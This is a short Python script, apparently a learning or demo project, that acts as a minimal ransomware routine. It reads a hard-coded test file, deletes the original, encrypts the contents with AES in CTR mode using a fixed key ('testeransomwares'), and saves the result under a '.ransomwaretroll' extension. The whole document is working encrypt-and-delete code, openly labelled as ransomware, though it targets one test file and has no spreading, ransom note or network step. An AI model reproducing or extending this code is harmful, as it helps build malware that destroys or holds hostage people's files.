import pyaes
import os
import sys

from file_handler import read_file, write_file, remove_file

file_name = "C:/Users/FLPCNC/Desktop/Ransomware/teste.txt"
file_data = read_file(file_name)

os.remove(file_name)

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

new_file_name = file_name + ".ransomwaretroll"
write_file(new_file_name, crypto_data)
